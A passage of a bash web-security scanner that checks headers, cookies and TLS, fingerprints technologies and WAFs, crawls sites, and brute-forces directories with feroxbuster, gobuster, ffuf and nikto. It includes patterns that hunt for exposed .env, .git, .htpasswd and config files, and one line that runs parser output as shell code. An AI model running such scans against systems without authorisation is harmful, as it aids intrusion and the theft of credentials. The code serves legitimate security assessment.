    if [[ -n "${WEB_PORTS:-}" ]]; then
        local -a ssl_web_ports=(443 8443 4443 9443)
        IFS=',' read -ra _web_port_arr <<< "$WEB_PORTS"
        for _wp in "${_web_port_arr[@]}"; do
            [[ "$_wp" =~ ^[0-9]+$ ]] || continue
            local _proto="http"
            printf '%s\n' "${ssl_web_ports[@]}" | grep -qx "$_wp" && _proto="https"
            WEB_TARGETS+=("${_proto}://${TARGET}:${_wp}")
        done
    fi
    # Deduplicate — add standard ports as fallback
    if [[ ${#WEB_TARGETS[@]} -eq 0 ]]; then
        WEB_TARGETS=("http://${TARGET}" "https://${TARGET}")
    fi
    # Deduplicate and cap at 20 to prevent runaway loops
    mapfile -t WEB_TARGETS < <(printf '%s\n' "${WEB_TARGETS[@]+"${WEB_TARGETS[@]}"}" | sort -u | head -20)

    # Guard: WEB_TARGETS must have at least one entry before iteration (set -u safe)
    [[ ${#WEB_TARGETS[@]} -eq 0 ]] && WEB_TARGETS=("http://${TARGET}")
    # Cap to 10 targets max
    for web_url in "${WEB_TARGETS[@]:0:10}"; do
        _is_valid_url "$web_url" || continue
        # Strict guard: skip anything not a valid http URL
        echo "$web_url" | grep -qE "^https?://[a-zA-Z0-9._-]" || continue
        local slug; slug=$(echo "$web_url" | sed 's|[^a-zA-Z0-9._-]|_|g' | cut -c1-40)
        [[ -z "$slug" ]] && continue

        # Headers
        run_tool_timeout "curl-headers-${slug}" "${curl_dir}/headers_${slug}.txt" 30 \
            curl -s -I -L --max-time 20 --connect-timeout 10 \
            -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36" \
            "$web_url" 2>/dev/null || true

        local hf="${curl_dir}/headers_${slug}.txt"
        if [[ -f "$hf" ]]; then
            # HTTP security headers
            local missing_headers=()
            grep -qi "Strict-Transport-Security"    "$hf" || missing_headers+=("Strict-Transport-Security")
            grep -qi "Content-Security-Policy"      "$hf" || missing_headers+=("Content-Security-Policy")
            grep -qi "X-Frame-Options"              "$hf" || missing_headers+=("X-Frame-Options")
            grep -qi "X-Content-Type-Options"       "$hf" || missing_headers+=("X-Content-Type-Options")
            grep -qi "Referrer-Policy"              "$hf" || missing_headers+=("Referrer-Policy")
            grep -qi "Permissions-Policy"           "$hf" || missing_headers+=("Permissions-Policy")
            grep -qi "X-XSS-Protection"             "$hf" || missing_headers+=("X-XSS-Protection")
            grep -qi "Cross-Origin-Resource-Policy" "$hf" || missing_headers+=("Cross-Origin-Resource-Policy")
            grep -qi "Cross-Origin-Opener-Policy"   "$hf" || missing_headers+=("Cross-Origin-Opener-Policy")

            if [[ ${#missing_headers[@]} -gt 0 ]]; then
                add_vuln "MEDIUM" "Missing HTTP Security Headers (${web_url})" \
                    "Missing security headers: ${missing_headers[*]}. Enables clickjacking, MIME sniffing, XSS, and MITM attacks." \
                    "Implement all security headers via server config or WAF." \
                    "Missing: ${missing_headers[*]}"
            fi

            # Server disclosure
            if grep -qi "^Server:" "$hf"; then
                local srv_header; srv_header=$(grep -i "^Server:" "$hf" | head -1)
                if echo "$srv_header" | grep -qiE "Apache/[0-9]|nginx/[0-9]|IIS/[0-9]|LiteSpeed/[0-9]"; then
                    add_vuln "LOW" "Server Version Disclosure" \
                        "HTTP Server header reveals exact software version, helping attackers target known CVEs." \
                        "Remove or obfuscate Server header. Set ServerTokens Prod (Apache) or server_tokens off (nginx)." \
                        "$srv_header"
                fi
            fi

            # X-Powered-By disclosure
            grep -qi "X-Powered-By" "$hf" && \
                add_vuln "LOW" "X-Powered-By Technology Disclosure" \
                    "X-Powered-By header reveals backend technology stack version." \
                    "Remove X-Powered-By header from all responses." \
                    "$(grep -i 'X-Powered-By' "$hf" | head -1)"

            # Cookie security
            if grep -qi "Set-Cookie" "$hf"; then
                local cookie_line; cookie_line=$(grep -i "Set-Cookie" "$hf" | head -1)
                echo "$cookie_line" | grep -qi "HttpOnly" || \
                    add_vuln "MEDIUM" "Session Cookie Missing HttpOnly Flag" \
                        "Session cookie lacks HttpOnly, allowing JavaScript access and XSS-based session theft." \
                        "Set HttpOnly flag on all session cookies." \
                        "$cookie_line"
                echo "$cookie_line" | grep -qi "Secure" || \
                    add_vuln "MEDIUM" "Session Cookie Missing Secure Flag" \
                        "Session cookie lacks Secure flag and may be transmitted over HTTP." \
                        "Set Secure flag on all authentication cookies." \
                        "$cookie_line"
                echo "$cookie_line" | grep -qi "SameSite" || \
                    add_vuln "LOW" "Session Cookie Missing SameSite Attribute" \
                        "Missing SameSite attribute may allow CSRF attacks." \
                        "Set SameSite=Strict or SameSite=Lax on session cookies." \
                        "$cookie_line"
            fi

            # HTTP to HTTPS redirect
            if echo "$web_url" | grep -q "^http://"; then
                # Use the FIRST HTTP status (before any -L redirect) to detect missing redirect
                local status_code; status_code=$(grep "^HTTP/" "$hf" | head -1 | awk '{print $2}' || echo "")
                if [[ -n "$status_code" ]] && \
                   [[ "$status_code" != "301" && "$status_code" != "302" && "$status_code" != "308" ]]; then
                    add_vuln "MEDIUM" "No HTTPS Redirect from HTTP (${web_url})" \
                        "Plain HTTP requests are not redirected to HTTPS, allowing credential interception over plaintext." \
                        "Add HTTP to HTTPS redirect. Implement HSTS." \
                        "HTTP status: ${status_code} — no TLS redirect"
                fi
            fi
        fi

        # Page source
        run_tool_timeout "curl-body-${slug}" "${curl_dir}/body_${slug}.html" 30 \
            curl -s -L --max-time 20 --connect-timeout 10 \
            -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36" \
            "$web_url" 2>/dev/null || true

        # robots.txt
        run_tool_timeout "curl-robots-${slug}" "${curl_dir}/robots_${slug}.txt" 10 \
            curl -s -L --max-time 10 --connect-timeout 5 "${web_url}/robots.txt" 2>/dev/null || true
        if [[ -f "${curl_dir}/robots_${slug}.txt" ]] && grep -qiE "Disallow|Allow" \
            "${curl_dir}/robots_${slug}.txt" 2>/dev/null; then
            add_vuln "INFO" "robots.txt Found — Path Disclosure" \
                "robots.txt reveals internal paths and directories that could expose admin panels or sensitive areas." \
                "Review robots.txt entries. Do not rely on it for security." \
                "$(grep -i 'Disallow' "${curl_dir}/robots_${slug}.txt" | head -5 | tr '\n' ' ')"
        fi

        # sitemap.xml
        run_tool_timeout "curl-sitemap-${slug}" "${curl_dir}/sitemap_${slug}.txt" 10 \
            curl -s -L --max-time 10 --connect-timeout 5 "${web_url}/sitemap.xml" 2>/dev/null || true
    done

    # httpx full target probe
    if command -v httpx &>/dev/null; then
        printf '%s\n' "${WEB_TARGETS[@]+"${WEB_TARGETS[@]}"}" > "${OUTPUT_DIR}/httpx/targets.txt"
        run_tool_timeout "httpx-probe" "${OUTPUT_DIR}/httpx/results.txt" 60 \
            httpx -l "${OUTPUT_DIR}/httpx/targets.txt" -silent \
            -title -tech-detect -status-code -follow-redirects \
            -content-length -response-time 2>/dev/null || true
    fi

    # Wayback URLs
    if command -v waybackurls &>/dev/null; then
        run_tool_timeout "waybackurls" "${OUTPUT_DIR}/curl/wayback_urls.txt" 120 \
            waybackurls "$TARGET" 2>/dev/null || true
    elif command -v gau &>/dev/null; then
        run_tool_timeout "gau" "${OUTPUT_DIR}/curl/gau_urls.txt" 120 \
            gau "$TARGET" 2>/dev/null || true
    fi

    # Katana spider
    if command -v katana &>/dev/null && [[ ${#WEB_TARGETS[@]} -gt 0 ]]; then
        run_tool_timeout "katana" "${OUTPUT_DIR}/curl/katana_crawl.txt" 120 \
            katana -u "${WEB_TARGETS[0]}" -d 3 -silent 2>/dev/null || true
    fi

    # hakrawler — fast JS-aware crawler extracting forms, subdomains, URLs
    if command -v hakrawler &>/dev/null && [[ ${#WEB_TARGETS[@]} -gt 0 ]]; then
        local hak_t=120; [[ "$SCAN_PROFILE" == "deep" ]] && hak_t=300
        run_tool_timeout "hakrawler" "${OUTPUT_DIR}/hakrawler/hakrawler.txt" "$hak_t" \
            bash -c 'printf "%s\n" "$1" | hakrawler -d 3 -subs -insecure 2>/dev/null' \
            -- "${WEB_TARGETS[0]}" || true
        # Merge any new URLs into wayback_urls for Phase 11 content discovery
        if [[ -s "${OUTPUT_DIR}/hakrawler/hakrawler.txt" ]] && command -v anew &>/dev/null; then
            cat "${OUTPUT_DIR}/hakrawler/hakrawler.txt" 2>/dev/null \
                | anew "${OUTPUT_DIR}/curl/wayback_urls.txt" > /dev/null 2>/dev/null || true
        fi
        local hak_count; hak_count=$(( $(wc -l < "${OUTPUT_DIR}/hakrawler/hakrawler.txt" 2>/dev/null || echo 0) + 0 ))
        log_ok "hakrawler: ${hak_count} URLs crawled"
    fi

    log_ok "Phase 8 complete. Web targets: ${#WEB_TARGETS[@]}"
    PHASES_COMPLETED=$(( PHASES_COMPLETED + 1 ))
}

# ════════════════════════════════════════════════════════════════════════════════
#  PHASE 9 — WEB TECHNOLOGY FINGERPRINTING
# ════════════════════════════════════════════════════════════════════════════════
phase_tech_fingerprint() {
    log_phase 9 "${PHASE_NAMES[9]}"

    for web_url in "${WEB_TARGETS[@]:0:5}"; do
        _is_valid_url "$web_url" || continue
        local slug; slug=$(echo "$web_url" | sed 's|[/:.]|_|g')

        # Structured Application-Layer extraction (JSON)
        local ww_json="${OUTPUT_DIR}/whatweb/whatweb_${slug}.json"
        local waf_json="${OUTPUT_DIR}/wafw00f/wafw00f_${slug}.json"

        # whatweb (JSON output)
        if command -v whatweb &>/dev/null; then
            run_tool_timeout "whatweb-${slug}" "${OUTPUT_DIR}/whatweb/whatweb_${slug}.txt" 60 \
                whatweb --no-errors -a 3 --log-json="$ww_json" "$web_url" 2>/dev/null || true
        fi

        # WAF detection (JSON output)
        if command -v wafw00f &>/dev/null; then
            run_tool_timeout "wafw00f-${slug}" "${OUTPUT_DIR}/wafw00f/wafw00f_${slug}.txt" 60 \
                wafw00f -a -o "$waf_json" "$web_url" 2>/dev/null || true
        fi

        # Extract deterministic state via web_parser.py
        source <(python3 "$SCRIPT_DIR/web_parser.py" "$ww_json" "$waf_json")

        # ── Explicit State Degradation Check ──────────────────────────────────
        if [[ "${WEB_PARSER_FAILURE:-false}" == "true" ]]; then
            log_warn "[EXPLICIT DEGRADATION] Web parser BLINDED: ${WEB_PARSER_REASON:-UNKNOWN}. CMS/Tech state is UNKNOWN, not SECURE."
            add_vuln "INFO" "Parser Degradation: WhatWeb/Wafw00f Data Corrupt" \
                "The web_parser.py engine failed to parse application fingerprinting data. Reason: ${WEB_PARSER_REASON:-UNKNOWN}. CMS type, web server, and technology stack are UNKNOWN. Dependent phases (CMS-specific scans, Nuclei tag routing) will operate in degraded mode." \
                "Re-run scan. If persistent, WAF may be injecting HTML into JSON output files." \
                "PARSER_FAILURE: ${WEB_PARSER_REASON:-UNKNOWN}"
        fi
        
        # Load state arrays and legacy booleans
        if [[ "$CMS_TYPE" == "WordPress" ]]; then IS_WORDPRESS=true; DETECTED_TECHS+=("wordpress"); fi
        if [[ "$CMS_TYPE" == "Drupal" ]]; then IS_DRUPAL=true; DETECTED_TECHS+=("drupal"); fi
        if [[ "$CMS_TYPE" == "Joomla" ]]; then IS_JOOMLA=true; DETECTED_TECHS+=("joomla"); fi

        # Version CVE Checks based on structured data
        if [[ -n "${PHP_VERSION:-}" ]]; then
            if echo "$PHP_VERSION" | grep -qE "^5\.|^7\."; then
                add_vuln "HIGH" "Outdated PHP Version (PHP/${PHP_VERSION})" \
                    "PHP ${PHP_VERSION} has reached end-of-life and contains unpatched CVEs including RCE vulnerabilities." \
                    "Upgrade to PHP 8.2+ immediately." "PHP/${PHP_VERSION} detected by structured whatweb data"
            fi
        fi
        
        if [[ -n "${APACHE_VERSION:-}" ]]; then
            add_vuln "INFO" "Apache Web Server Identified (Apache/${APACHE_VERSION})" \
                "Apache version visible. Check for known CVEs." \
                "Keep Apache updated. Hide version with ServerTokens Prod." "Apache/${APACHE_VERSION}"
        fi

        # Load state arrays
        if [[ -n "${DETECTED_TECHS_ARRAY:-}" ]]; then
            for _t in $DETECTED_TECHS_ARRAY; do
                DETECTED_TECHS+=("$_t")
            done
        fi

        [[ "$HAS_WAF" == "true" ]] && log_ok "WAF detected (Structured): ${WAF_NAME}"
    done

    # Deduplicate DETECTED_TECHS
    local -a _unique_techs=()
    local _seen=""
    for _t in "${DETECTED_TECHS[@]+${DETECTED_TECHS[@]}}"; do
        echo "$_seen" | grep -q "|${_t}|" && continue
        _unique_techs+=("$_t"); _seen="${_seen}|${_t}|"
    done
    DETECTED_TECHS=("${_unique_techs[@]+${_unique_techs[@]}}")
    log_ok "Phase 9 complete. CMS: ${CMS_TYPE:-none} | WAF: ${HAS_WAF} | Techs: ${DETECTED_TECHS[*]:-none}"
    PHASES_COMPLETED=$(( PHASES_COMPLETED + 1 ))
}

# ════════════════════════════════════════════════════════════════════════════════
#  PHASE 10 — SSL/TLS DEEP ANALYSIS
# ════════════════════════════════════════════════════════════════════════════════
phase_ssl() {
    log_phase 10 "${PHASE_NAMES[10]}"
    local ssl_dir="${OUTPUT_DIR}/ssl"

    # Skip if no HTTPS ports
    if ! echo "${WEB_PORTS:-}" | grep -qE "443|8443" && \
       ! echo "${WEB_TARGETS[*]:-}" | grep -qi "https://"; then
        log_info "No HTTPS ports detected -- skipping SSL analysis"
        PHASES_COMPLETED=$(( PHASES_COMPLETED + 1 ))
        return 0
    fi

    local ssl_target="$TARGET"
    local ssl_port=443
    echo "${WEB_PORTS:-}" | grep -q "8443" && ssl_port=8443

    # MANDATE 5: Run BOTH sslyze and testssl.sh for cross-tool consensus
    local sslyze_ran=false testssl_ran=false

    # Tool 1: sslyze
    if command -v sslyze &>/dev/null; then
        log_info "sslyze: scanning ${ssl_target}:${ssl_port}..."
        local sslyze_t; sslyze_t=$(proxy_timeout 180)
        if run_tool_timeout "sslyze" "${ssl_dir}/sslyze.txt" "$sslyze_t" \
            sslyze --regular --json_out="${ssl_dir}/sslyze.json" \
            "${ssl_target}:${ssl_port}" 2>/dev/null; then
            [[ -s "${ssl_dir}/sslyze.json" || -s "${ssl_dir}/sslyze.txt" ]] && sslyze_ran=true
        else
            log_warn "sslyze failed. Hostile environment or probe blocking detected."
        fi
    fi

    # Tool 2: testssl.sh
    if command -v testssl.sh &>/dev/null || command -v testssl &>/dev/null; then
        local testssl_cmd="testssl.sh"
        command -v testssl.sh &>/dev/null || testssl_cmd="testssl"
        log_info "testssl.sh: scanning ${ssl_target}:${ssl_port}..."
        local testssl_t; testssl_t=$(proxy_timeout 180)
        run_tool_timeout "testssl" "${ssl_dir}/testssl.txt" "$testssl_t" \
            "$testssl_cmd" --jsonfile "${ssl_dir}/testssl.json" \
            --severity HIGH --warnings off --color 0 \
            "${ssl_target}:${ssl_port}" 2>/dev/null || true
        [[ -s "${ssl_dir}/testssl.json" || -s "${ssl_dir}/testssl.txt" ]] && testssl_ran=true
    fi

    # Fallback: nmap ssl-enum-ciphers
    if [[ "$sslyze_ran" != true && "$testssl_ran" != true ]]; then
        log_info "Fallback: nmap ssl-enum-ciphers..."
        local nmap_ssl_t; nmap_ssl_t=$(proxy_timeout 90)
        run_tool_timeout "nmap-ssl" "${ssl_dir}/nmap_ssl.txt" "$nmap_ssl_t" \
            nmap --script ssl-enum-ciphers,ssl-cert,ssl-heartbleed \
            -p "$ssl_port" "$ssl_target" 2>/dev/null || true
    fi

    # MANDATE 5: Voting System -- only report vulns confirmed by 2+ tools or 1 tool with strong evidence
    local -A ssl_votes  # associative array: vuln_name -> vote_count

    # Parse sslyze results
    if [[ "$sslyze_ran" == true ]]; then
        local sf="${ssl_dir}/sslyze.txt"
        local sj="${ssl_dir}/sslyze.json"
        # Check via text output
        grep -qiE "HEARTBLEED.*VULNERABLE" "$sf" 2>/dev/null && ssl_votes[heartbleed]=$(( ${ssl_votes[heartbleed]:-0} + 1 ))
        grep -qiE "SSLV2.*accepted\|SSLv2" "$sf" 2>/dev/null && ssl_votes[sslv2]=$(( ${ssl_votes[sslv2]:-0} + 1 ))
        grep -qiE "SSLV3.*accepted\|SSLv3" "$sf" 2>/dev/null && ssl_votes[sslv3]=$(( ${ssl_votes[sslv3]:-0} + 1 ))
        grep -qiE "CRIME.*VULNERABLE" "$sf" 2>/dev/null && ssl_votes[crime]=$(( ${ssl_votes[crime]:-0} + 1 ))
        grep -qiE "POODLE.*VULNERABLE" "$sf" 2>/dev/null && ssl_votes[poodle]=$(( ${ssl_votes[poodle]:-0} + 1 ))
        grep -qiE "expired\|not.yet.valid" "$sf" 2>/dev/null && ssl_votes[cert_expired]=$(( ${ssl_votes[cert_expired]:-0} + 1 ))
        grep -qiE "self.signed\|selfsigned" "$sf" 2>/dev/null && ssl_votes[self_signed]=$(( ${ssl_votes[self_signed]:-0} + 1 ))
        grep -qiE "RC4\|DES\|NULL\|EXPORT\|anon" "$sf" 2>/dev/null && ssl_votes[weak_cipher]=$(( ${ssl_votes[weak_cipher]:-0} + 1 ))
        # jq parsing for higher accuracy
        if [[ "$JQ_AVAILABLE" == true ]] && [[ -s "$sj" ]]; then
            jq -e '.server_scan_results[].scan_commands_results.heartbleed // empty | .is_vulnerable_to_heartbleed' "$sj" 2>/dev/null | grep -q "true" && \
                ssl_votes[heartbleed]=$(( ${ssl_votes[heartbleed]:-0} + 1 ))
        fi
    fi

    # Parse testssl.sh results
    if [[ "$testssl_ran" == true ]]; then
        local tf="${ssl_dir}/testssl.txt"
        local tj="${ssl_dir}/testssl.json"
        grep -qiE "VULNERABLE.*Heartbleed\|heartbleed.*VULNERABLE" "$tf" 2>/dev/null && ssl_votes[heartbleed]=$(( ${ssl_votes[heartbleed]:-0} + 1 ))
        grep -qiE "SSLv2.*offered\|offered.*SSLv2" "$tf" 2>/dev/null && ssl_votes[sslv2]=$(( ${ssl_votes[sslv2]:-0} + 1 ))
        grep -qiE "SSLv3.*offered\|offered.*SSLv3" "$tf" 2>/dev/null && ssl_votes[sslv3]=$(( ${ssl_votes[sslv3]:-0} + 1 ))
        grep -qiE "CRIME.*VULNERABLE\|VULNERABLE.*CRIME" "$tf" 2>/dev/null && ssl_votes[crime]=$(( ${ssl_votes[crime]:-0} + 1 ))
        grep -qiE "POODLE.*VULNERABLE\|VULNERABLE.*POODLE" "$tf" 2>/dev/null && ssl_votes[poodle]=$(( ${ssl_votes[poodle]:-0} + 1 ))
        grep -qiE "expired\|Certificate Validity.*expired" "$tf" 2>/dev/null && ssl_votes[cert_expired]=$(( ${ssl_votes[cert_expired]:-0} + 1 ))
        grep -qiE "self.signed" "$tf" 2>/dev/null && ssl_votes[self_signed]=$(( ${ssl_votes[self_signed]:-0} + 1 ))
        grep -qiE "RC4\|DES\|NULL\|EXPORT\|anon" "$tf" 2>/dev/null && ssl_votes[weak_cipher]=$(( ${ssl_votes[weak_cipher]:-0} + 1 ))
        # jq parsing
        if [[ "$JQ_AVAILABLE" == true ]] && [[ -s "$tj" ]]; then
            jq -e '.[] | select(.id=="heartbleed") | select(.severity=="CRITICAL" or .severity=="HIGH")' "$tj" 2>/dev/null | grep -q "." && \
                ssl_votes[heartbleed]=$(( ${ssl_votes[heartbleed]:-0} + 1 ))
        fi
    fi

    # Parse nmap fallback
    if [[ -f "${ssl_dir}/nmap_ssl.txt" ]]; then
        local nf="${ssl_dir}/nmap_ssl.txt"
        grep -qiE "VULNERABLE.*heartbleed\|heartbleed.*VULNERABLE" "$nf" 2>/dev/null && ssl_votes[heartbleed]=$(( ${ssl_votes[heartbleed]:-0} + 1 ))
        grep -qiE "SSLv2\|SSLv3" "$nf" 2>/dev/null && ssl_votes[sslv3]=$(( ${ssl_votes[sslv3]:-0} + 1 ))
        grep -qiE "RC4\|DES\|NULL" "$nf" 2>/dev/null && ssl_votes[weak_cipher]=$(( ${ssl_votes[weak_cipher]:-0} + 1 ))
    fi

    # MANDATE 5: Report only consensus-confirmed vulnerabilities
    local vote_threshold=1
    [[ "$sslyze_ran" == true && "$testssl_ran" == true ]] && vote_threshold=2

    log_section "SSL Voting Results (threshold: ${vote_threshold})..."
    local consensus_log="${ssl_dir}/ssl_consensus.txt"
    : > "$consensus_log" 2>/dev/null || true

    for vuln_key in "${!ssl_votes[@]}"; do
        local votes=${ssl_votes[$vuln_key]}
        echo "${vuln_key}: ${votes} vote(s) (threshold: ${vote_threshold})" >> "$consensus_log"
        if [[ $votes -ge $vote_threshold ]]; then
            case "$vuln_key" in
                heartbleed)
                    add_vuln "CRITICAL" "Heartbleed (CVE-2014-0160) -- Consensus Confirmed" \
                        "OpenSSL memory leak allowing theft of server private keys and session data." \
                        "Update OpenSSL immediately. Revoke and reissue all certificates." \
                        "Confirmed by ${votes} tool(s)"
                    ;;
                sslv2)
                    add_vuln "CRITICAL" "SSLv2 Enabled -- Consensus Confirmed" \
                        "SSLv2 is broken and enables DROWN attack on all servers sharing the same certificate." \
                        "Disable SSLv2 immediately in server configuration." \
                        "Confirmed by ${votes} tool(s)"
                    ;;
                sslv3)
                    add_vuln "HIGH" "SSLv3 Enabled -- Consensus Confirmed" \
                        "SSLv3 is vulnerable to POODLE attack." \
                        "Disable SSLv3. Use TLS 1.2+ only." \
                        "Confirmed by ${votes} tool(s)"
                    ;;
                poodle)
                    add_vuln "HIGH" "POODLE (CVE-2014-3566) -- Consensus Confirmed" \
                        "POODLE attack exploits SSLv3 CBC padding to decrypt HTTPS traffic." \
                        "Disable SSLv3 and TLS 1.0 CBC ciphers." \
                        "Confirmed by ${votes} tool(s)"
                    ;;
                crime)
                    add_vuln "MEDIUM" "CRIME/BREACH Compression Attack -- Consensus Confirmed" \
                        "TLS compression enabled, allowing CRIME/BREACH side-channel attacks." \
                        "Disable TLS compression." \
                        "Confirmed by ${votes} tool(s)"
                    ;;
                cert_expired)
                    add_vuln "HIGH" "SSL Certificate Expired -- Consensus Confirmed" \
                        "SSL certificate has expired. Browsers will show security warnings." \
                        "Renew the certificate immediately." \
                        "Confirmed by ${votes} tool(s)"
                    ;;
                self_signed)
                    add_vuln "MEDIUM" "Self-Signed Certificate -- Consensus Confirmed" \
                        "Self-signed certificate is not trusted by browsers." \
                        "Use a certificate from a trusted CA (Let's Encrypt is free)." \
                        "Confirmed by ${votes} tool(s)"
                    ;;
                weak_cipher)
                    add_vuln "HIGH" "Weak SSL Ciphers Accepted -- Consensus Confirmed" \
                        "Server accepts weak ciphers (RC4/DES/NULL/EXPORT/anon) vulnerable to known attacks." \
                        "Configure server for strong ciphers only. Use Mozilla SSL Configuration Generator." \
                        "Confirmed by ${votes} tool(s)"
                    ;;
            esac
            log_ok "SSL CONFIRMED: ${vuln_key} (${votes} votes)"
        else
            log_info "SSL UNCONFIRMED: ${vuln_key} (${votes}/${vote_threshold} votes -- not reported)"
        fi
    done

    log_ok "Phase 10 complete."
    PHASES_COMPLETED=$(( PHASES_COMPLETED + 1 ))
}

# ════════════════════════════════════════════════════════════════════════════════
#  PHASE 11 — WEB CONTENT DISCOVERY & FUZZING
# ════════════════════════════════════════════════════════════════════════════════
phase_content_discovery() {
    log_phase 11 "${PHASE_NAMES[11]}"

    [[ ${#WEB_TARGETS[@]} -eq 0 ]] && WEB_TARGETS=("http://${TARGET}")

    for web_url in "${WEB_TARGETS[@]:0:3}"; do
        _is_valid_url "$web_url" || continue
        local slug; slug=$(echo "$web_url" | sed 's|[/:.]|_|g')
        local wlist_dir="/usr/share/wordlists"
        local wlist_web=""

        # Find best wordlist
        for wl in "${wlist_dir}/dirb/common.txt" \
                   "/usr/share/seclists/Discovery/Web-Content/common.txt" \
                   "${wlist_dir}/dirbuster/directory-list-2.3-medium.txt" \
                   "${wlist_dir}/dirb/big.txt"; do
            [[ -f "$wl" ]] && wlist_web="$wl" && break
        done

        if [[ -z "$wlist_web" ]]; then
            log_warn "No wordlist found. Skipping directory brute-force."
            continue
        fi

        # feroxbuster (fastest)
        if command -v feroxbuster &>/dev/null; then
            local fero_ext="php,asp,aspx,jsp,html,js,json,txt,xml,bak,conf,env,zip,sql,tar,gz"
            local fero_t=180  # default — overridden per profile below
            [[ "$SCAN_PROFILE" == "quick"    ]] && fero_t=120
            [[ "$SCAN_PROFILE" == "standard" ]] && fero_t=300
            [[ "$SCAN_PROFILE" == "deep"     ]] && fero_t=600
            run_tool_timeout "feroxbuster-${slug}" \
                "${OUTPUT_DIR}/feroxbuster/fero_${slug}.txt" "$fero_t" \
                feroxbuster --url "$web_url" --wordlist "$wlist_web" \
                --extensions "$fero_ext" --threads 50 --depth 3 \
                --quiet --filter-status 404,500,503 2>/dev/null || true

            local ff="${OUTPUT_DIR}/feroxbuster/fero_${slug}.txt"
            if [[ -f "$ff" ]]; then
                grep -qiE "\.git\b|/\.git" "$ff" && \
                    add_vuln "CRITICAL" ".git Repository Exposed (${web_url})" \
                        ".git directory is publicly accessible. Attacker can reconstruct entire source code, secrets, and credentials." \
                        "Block access to .git directory. Add to .htaccess: Deny from all. Use web server rules." \
                        "${web_url}/.git — accessible"
                grep -qiE "\.env\b|/\.env" "$ff" && \
                    add_vuln "CRITICAL" ".env File Exposed (${web_url})" \
                        ".env file contains plaintext passwords, API keys, and database credentials." \
                        "Block .env access immediately. Rotate all credentials. Use environment variables." \
                        "${web_url}/.env — accessible"
                grep -qi "\.htpasswd\b" "$ff" && \
                    add_vuln "HIGH" ".htpasswd File Exposed (${web_url})" \
                        "Password hash file is accessible, allowing offline cracking." \
                        "Move .htpasswd outside web root. Restrict access via web server config." \
                        "${web_url}/.htpasswd — accessible"
                grep -qiE "backup|\.bak|\.old|\.orig|dump\.sql" "$ff" && \
                    add_vuln "HIGH" "Backup/Dump Files Exposed (${web_url})" \
                        "Backup files may contain source code, database dumps, or credentials." \
                        "Remove all backup files from web root. Add to .gitignore." \
                        "$(grep -iE 'backup|\.bak|\.old|dump\.sql' "$ff" | head -3)"
                grep -qiE "admin|/admin/|/panel/|/console" "$ff" && \
                    add_vuln "MEDIUM" "Admin Interface Discovered (${web_url})" \
                        "Admin panel found. Brute-force and credential attacks possible." \
                        "Restrict admin access by IP. Implement 2FA. Rate limit login attempts." \
                        "$(grep -iE '/admin|/panel|/console' "$ff" | head -3)"
                grep -qi "xmlrpc\.php" "$ff" && \
                    add_vuln "HIGH" "XML-RPC Enabled (${web_url}/xmlrpc.php)" \
                        "xmlrpc.php allows brute-force amplification (1000 passwords per request). Used in DDoS and credential attacks." \
                        "Disable xmlrpc.php or restrict access via .htaccess." \
                        "${web_url}/xmlrpc.php — accessible"
                grep -qiE "upload|/uploads/" "$ff" && \
                    add_vuln "MEDIUM" "Upload Directory Found (${web_url})" \
                        "Upload directory exists. May allow webshell upload if not properly secured." \
                        "Disable directory listing. Restrict file uploads to allowed types. Use separate domain." \
                        "$(grep -iE '/upload' "$ff" | head -2)"
                grep -qiE "config\.php|config\.ini|web\.config|application\.yml" "$ff" && \
                    add_vuln "HIGH" "Configuration File Exposed (${web_url})" \
                        "Config files may contain credentials, DB connection strings, or API keys." \
                        "Block config file access. Move configs outside web root." \
                        "$(grep -iE 'config\.(php|ini|yml)' "$ff" | head -2)"
                grep -qiE "\.DS_Store|Thumbs\.db" "$ff" && \
                    add_vuln "LOW" "OS Metadata Files Exposed (.DS_Store / Thumbs.db)" \
                        "macOS/Windows index files expose directory structure and filenames." \
                        "Add .DS_Store and Thumbs.db to .gitignore and block via web server." \
                        "Metadata files found in web root"
            fi
        fi

        # gobuster
        # Skip DNS brute force if wildcard detected
    if command -v gobuster &>/dev/null && [[ "$WILDCARD_DNS" == false ]]; then
            local gob_t=240
            [[ "$SCAN_PROFILE" == "quick" ]] && gob_t=90
            run_tool_timeout "gobuster-${slug}" "${OUTPUT_DIR}/gobuster/gobuster_${slug}.txt" \
                "$gob_t" \
                gobuster dir -u "$web_url" -w "$wlist_web" \
                -x php,asp,aspx,html,txt,bak,conf,js -t 40 -q --no-error \
                2>/dev/null || true
        fi

        # ffuf
        if command -v ffuf &>/dev/null; then
            local ffuf_t=240
            [[ "$SCAN_PROFILE" == "quick" ]] && ffuf_t=90
            local ffuf_json="${OUTPUT_DIR}/ffuf/ffuf_${slug}.json"
            run_tool_timeout "ffuf-${slug}" "${OUTPUT_DIR}/ffuf/ffuf_${slug}_stdout.txt" \
                "$ffuf_t" \
                ffuf -w "${wlist_web}:FUZZ" -u "${web_url}/FUZZ" \
                -mc 200,201,301,302,401,403 -t 40 -silent \
                -o "$ffuf_json" -of json 2>/dev/null || true
        fi

        # nikto
        if command -v nikto &>/dev/null; then
            local nikto_t=300
            [[ "$SCAN_PROFILE" == "quick" ]] && nikto_t=120
            [[ "$SCAN_PROFILE" == "deep"  ]] && nikto_t=600
            run_tool_timeout "nikto-${slug}" "${OUTPUT_DIR}/nikto/nikto_${slug}.txt" "$nikto_t" \
                nikto -h "$web_url" -nointeractive -Format txt 2>/dev/null || true

            local nf="${OUTPUT_DIR}/nikto/nikto_${slug}.txt"
            if [[ -f "$nf" ]]; then
                grep -qiE "TRACE|HTTP TRACE" "$nf" && \
                    add_vuln "MEDIUM" "HTTP TRACE Method Enabled (${web_url})" \
                        "TRACE method enables Cross-Site Tracing (XST) attacks to steal cookies/auth headers." \
                        "Disable TRACE in web server config." \
                        "nikto: TRACE method enabled"
                grep -qiE "directory.*listing|index of" "$nf" && \
                    add_vuln "MEDIUM" "Directory Listing Enabled (${web_url})" \
                        "Web server lists directory contents, exposing files and structure." \
                        "Disable directory listing: Options -Indexes (Apache) or autoindex off (nginx)." \
                        "nikto: directory listing"
                grep -qiE "ETag|inode" "$nf" && \
                    add_vuln "LOW" "ETag Header Exposes Inode Information" \
                        "ETag header may leak internal inode numbers, aiding reconnaissance." \
                        "Configure FileETag None in Apache or remove ETag header." \
                        "nikto: ETag inode disclosure"
            fi
        fi

        # dirb (as backup)
        if command -v dirb &>/dev/null && [[ "$SCAN_PROFILE" != "quick" ]]; then
